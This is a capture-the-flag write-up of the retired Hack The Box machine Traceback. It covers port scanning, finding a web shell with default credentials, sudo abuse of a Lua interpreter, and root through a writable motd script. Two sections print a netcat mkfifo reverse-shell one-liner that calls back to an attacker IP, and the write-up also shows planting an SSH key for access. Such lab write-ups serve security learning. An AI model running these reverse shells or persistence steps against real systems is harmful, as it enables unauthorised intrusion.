---
title: "HTB Traceback Writeup"
date: 2022-03-24T09:22:50+05:30
tags: ['Easy', 'Linux', 'Retired','Interesting Enumeration']
categories: ['Linux Easy']
draft: false
---


# Process
*	Enumeration started with Nmap. Found( results corroborated with nmap): 
	*	22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	*	80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
*	Webpage informed the site has been hacked and a backdoor is present
	*	No vhost found
	*	No directories found with `/dirb/common.txt` and `/dirbuster/directory-list-2.3-medium.txt`
	*	Found `smevk.php` using `/usr/share/seclist/directories/backdoor_list.txt`
*	`/smevk.php` had default credentials `admin:admin`
	*	It had a field for RCE, obtained a reverse shell as webadmin
	*	Stabalized the shell
*	No userflag present in home directory of webadmin
	*	`/note.txt` present. It indicated the presense of tool to practice Lua
	*	After executing linpeas, It found that history fles had sudo commands. It indicated the presense of a tool called luvit
	*	It was corroborated uisng `sudo -l`
*	Ability to run `luvit` as `sysadmin` was leveraged to get a shell by executing `os.execute('/bin/bash -p')` in lua
	*	Got userflag
*	Privilege escalation was interesting. It involved setting up ssh access and leveraging the process execution.
	*	sysadmin had write access to motd files. which are used to display welocome message on sucessful login 
	*	Appended a shell to motd file. Whenever a user would login a reverse shell would we received on netcat listener
* To trigger the execution of payload. We had to ssh onto the system. We didn't know any password or had any private key.
	* Created a ssh-keypair on attacker's device. Appended the public key to `authorized_keys` on victim's device
	* Logged in using the private key. Thus, triggering the exploit and receiving a root shell on netcat listener

## 1. Enumeration
### 1.1 Nmap
*   Scanned all the ports. Found 22/tcp SSH and 80/tcp http open.

```bash
sudo nmap -A -Pn -sC traceback.htb -oN traceback.htb -T4
[sudo] password for babayaga: 
Sorry, try again.
[sudo] password for babayaga: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-23 00:52 IST
Nmap scan report for traceback.htb (10.129.114.213)
Host is up (0.16s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=3/23%OT=22%CT=1%CU=40247%PV=Y%DS=2%DC=T%G=Y%TM=623A21F
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1
OS:1NW7%O6=M505ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   156.08 ms 10.10.14.1
2   151.82 ms traceback.htb (10.129.114.213)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.97 seconds
```

## 2. {?h}ttp://traceback.htb

### Webpage
{{<figure src="/images/traceback/webpage.png" title="traceback.htb Webpage">}}

### ffuf
*	vhost and directory enumeration didn't provide any useful information with `common.txt` and `/dirbuster/directory-list-2.3-medium.txt`
*	Found `backdoor_list.txt` in seclist
```bash
gobuster dir -u http://traceback.htb -w /usr/share/seclists/Web-Shells/backdoor_list.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://traceback.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Web-Shells/backdoor_list.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/23 06:48:58 Starting gobuster in directory enumeration mode
===============================================================
/smevk.php            (Status: 200) [Size: 1261]
                                                
===============================================================
2022/03/23 06:49:12 Finished
===============================================================
```

## Foothold

### /smevk.php
Tried default credentials. They worked.
->	Username: admin
->	Password: admin
{{<figure src="/images/traceback/smevk-php.png" title="Backdoor URI">}}

### rev-shell
Shell
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.96 4343 >/tmp/f
```

{{<figure src="/images/traceback/rev-shell.png" title="Reverse Shell">}}

### note.txt
```bash
webadmin@traceback:/home/webadmin$ ls
total 44
drwxr-x--- 5 webadmin sysadmin 4096 Apr 22  2021 .
drwxr-xr-x 4 root     root     4096 Aug 25  2019 ..
-rw------- 1 webadmin webadmin  105 Mar 16  2020 .bash_history
-rw-r--r-- 1 webadmin webadmin  220 Aug 23  2019 .bash_logout
-rw-r--r-- 1 webadmin webadmin 3771 Aug 23  2019 .bashrc
drwx------ 2 webadmin webadmin 4096 Aug 23  2019 .cache
drwxrwxr-x 3 webadmin webadmin 4096 Apr 22  2021 .local
-rw-rw-r-- 1 webadmin webadmin    1 Aug 25  2019 .luvit_history
-rw-r--r-- 1 webadmin webadmin  807 Aug 23  2019 .profile
drwxrwxr-x 2 webadmin webadmin 4096 Feb 27  2020 .ssh
-rw-rw-r-- 1 sysadmin sysadmin  122 Mar 16  2020 note.txt
webadmin@traceback:/home/webadmin$ cat note.txt
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
```

### linpeas.sh
Created simple webserver on my device using python and transferred linpeas.sh using wget.

{{<figure src="/images/traceback/privsec.lua.png" title="Linpeas Revalation">}}


### sudo -l

```bash
atching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
```

Command doesn't work
```
lua min@traceback:/home/webadmin$ sudo -u sysadmin /home/sysadmin/luvit privesc.
Uncaught exception:
[string "bundle:deps/require.lua"]:279: No such module '/home/webadmin/privesc.lua' in 'bundle:/main.lua'
module '/home/webadmin/privesc.lua' not found:
	no field package.preload['/home/webadmin/privesc.lua']
	no file './/home/webadmin/privesc/lua.lua'
```

Why? We get it when we read `/home/webadmin/.bash_history`. It was a custom script which was deleted after its execution.
```text
webadmin@traceback:/home/webadmin$ cat .bash_history 
ls -la
sudo -l
nano privesc.lua
sudo -u sysadmin /home/sysadmin/luvit privesc.lua 
rm privesc.lua
logout
```

Intrestingly, to understand the working of this tool. I tried using some common flags such as `-help`. Here, we can drop in to repel and execute `os.execute("/bin/sh -p")`. `-p` is to preserve privilege, it might work without it but I didn't try that.

```bash
webadmin@traceback:/home/webadmin$ sudo -u sysadmin /home/sysadmin/luvit --help
Usage: /home/sysadmin/luvit [options] script.lua [arguments]

  Options:
    -h, --help          Print this help screen.
    -v, --version       Print the version.
    -e code_chunk       Evaluate code chunk and print result.
    -i, --interactive   Enter interactive repl after executing script.
    -n, --no-color      Disable colors.
    -c, --16-colors     Use simple ANSI colors
    -C, --256-colors    Use 256-mode ANSI colors
                        (Note, if no script is provided, a repl is run instead.)
  
```
### sysadmin

```bash
webadmin@traceback:/home/webadmin$ sudo -u sysadmin /home/sysadmin/luvit
Welcome to the Luvit repl!
> os.execute("/bin/sh -p")
$ whoami
sysadmin
```

### UserFlag
```bash
$ cat user.txt
897a227b98a20eebf1bf010077eb529d
```


## Privilege Escaltion
Executed Linpeas.sh and carried out other enumeration, didn't obtain anything useful. Moved on to enumerating processes.
#### pspy
Transferred pspy binary using python webserver and wget. Executed it and found some intresting processes. Here, every 30 seconds all the files from `/var/backups/.update-motd.d/` are being copied to `/etc/update-motd.d`. I decided to checkout these files.

```bash
022/03/22 19:34:55 CMD: UID=0    PID=1      | /sbin/init noprompt 
2022/03/22 19:35:01 CMD: UID=0    PID=59061  | sleep 30 
2022/03/22 19:35:01 CMD: UID=0    PID=59059  | /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ 
2022/03/22 19:35:01 CMD: UID=???  PID=59057  | ???
2022/03/22 19:35:01 CMD: UID=0    PID=59056  | /usr/sbin/CRON -f 
2022/03/22 19:35:31 CMD: UID=0    PID=59062  | /bin/cp /var/backups/.update-motd.d/00-header /var/backups/.update-motd.d/10-help-text /var/backups/.update-motd.d/50-motd-news /var/backups/.update-motd.d/80-esm /var/backups/.update-motd.d/91-release-upgrade /etc/update-motd.d/ 
2022/03/22 19:36:01 CMD: UID=0    PID=59069  | sleep 30 
2022/03/22 19:36:01 CMD: UID=0    PID=59066  | /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ 
2022/03/22 19:36:01 CMD: UID=0    PID=59063  | /usr/sbin/CRON -f 
```

#### permissions
While checking out directory, I found it intresting that sysadmin group also owned the file. I checked the files, they were similar to other motd files i.e., had welcome messages. 

`sysadmin@traceback` has write privilege and the ssh service is executed with root privilege. It means that we can append a reverse-shell payload to `00-header`. It means that in case of a ssh login, the `00-header` will execute with root privileges and we recieve a bash shell at our netacat listener.

```bash
sysadmin@traceback:/etc/update-motd.d$ ll
total 32
drwxr-xr-x  2 root sysadmin 4096 Apr 22  2021 ./
drwxr-xr-x 80 root root     4096 Apr 22  2021 ../
-rwxrwxr-x  1 root sysadmin  981 Mar 23 14:59 00-header*
-rwxrwxr-x  1 root sysadmin  982 Mar 23 14:59 10-help-text*
-rwxrwxr-x  1 root sysadmin 4264 Mar 23 14:59 50-motd-news*
-rwxrwxr-x  1 root sysadmin  604 Mar 23 14:59 80-esm*
-rwxrwxr-x  1 root sysadmin  299 Mar 23 14:59 91-release-upgrade*
```


#### ssh-keypair
To execute the message of the day files, we had to successfully login to the system using ssh, but there are no private keys in any of the `/.ssh` and neither did we find any passwords. 

Workaround: We could generate a ssh-keypair. Insert the keypair into `/.ssh/authorized_key` and logging in with the private key. 

Credentials `Password: hello`

```bash
─[babayaga@babayaga-virtualbox]─[~/Desktop/HTB/Linux/Traceback/exploit]
└──╼ $ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/home/babayaga/.ssh/id_rsa): traceback_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in traceback_rsa
Your public key has been saved in traceback_rsa.pub
The key fingerprint is:
SHA256:m2YazV0QAAENUTslPSTkk87Lmb5ChAc+t0psGlxCtjo babayaga@babayaga-virtualbox
The key's randomart image is:
+---[RSA 3072]----+
|    +BB=+..      |
| o.  ..*o  .     |
|o..o  *  ..      |
| o+.+o o   .     |
|o.o= .o S   .    |
|E.+ o. * + .     |
| * o  * B .      |
|. . .. =         |
|     .+.         |
+----[SHA256]-----+
```

#### Adding traceback_rsa.pub to authorized hosts
```bash
sysadmin@traceback:~/.ssh$ cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2IOkdCCivjc05A/Wt1xpbpdXQECh8CzO/5prqe+S2JzCFWsPPtlpSxmW72czq3I9CzdP7RLC+lMPhY0px6XLJkMdho0lkniB5UdpPYbxcH7ZqQB1DhF1bD+zLHHb8pBWm
+5Kg47X810Apay6FD+tlolz6u4ptSpjqJZv583powht0PQ4ITRwiIJOEbt8E5fpTPCJ8TTb2MxNvtpwh9M3zGhzWDQxSapsjI1/DMZoGIf+MJleC5mawJ5AaCOcYI96kAG4a78GVVLlHNNhB9PDqDlv37x2rF+1GH+7P0d3M
0gzqYzeCYhvEPTH2UX7GCoGY8wArS/dFguzuMzPqsQhj9fY69XQEloGkUVc46bJ0lEY/IzL5wLYOVHa+TymQSPxdXeCPwvD4KdK80ZHNUcAd0N6jKMJKhnwgGsExW5u5MisBixSYTxWGgUSynQgUolSspAoCbby5cnCPIO0O
8JRd6zbe0uvNkL5fQ9YFaPI+46q5KwYAKbAU3m3UXQD3RXs= babayaga@babayaga-virtualbox
```

#### Logging in as sysadmin
```bash
┌─[babayaga@babayaga-virtualbox]─[~/Desktop/HTB/Linux/Traceback/exploit]
└──╼ $ssh -i traceback_rsa sysadmin@traceback.htb
The authenticity of host 'traceback.htb (10.129.114.213)' can't be established.
ECDSA key fingerprint is SHA256:7PFVHQKwaybxzyT2EcuSpJvyQcAASWY9E/TlxoqxInU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'traceback.htb,10.129.114.213' (ECDSA) to the list of known hosts.
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################
Enter passphrase for key 'traceback_rsa': 
Enter passphrase for key 'traceback_rsa': 

Welcome to Xh4H land 



Last login: Mon Mar 16 03:50:24 2020 from 10.10.14.2
$ whoami
sysadmin
$ 
```



{{<figure src="/images/traceback/motd.png" title="Directory Containing the Backdoor">}}


#### Payload added to `/etc/update-motd.d/00-header`
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.96 4242 >/tmp/f
```


### Shell
{{<figure src="/images/traceback/root-shell.png" title="Shell as Root">}}

```bash
# whoami
root
# cat root.txt
c5d0f8fec6289f10648abbf689da5026
```

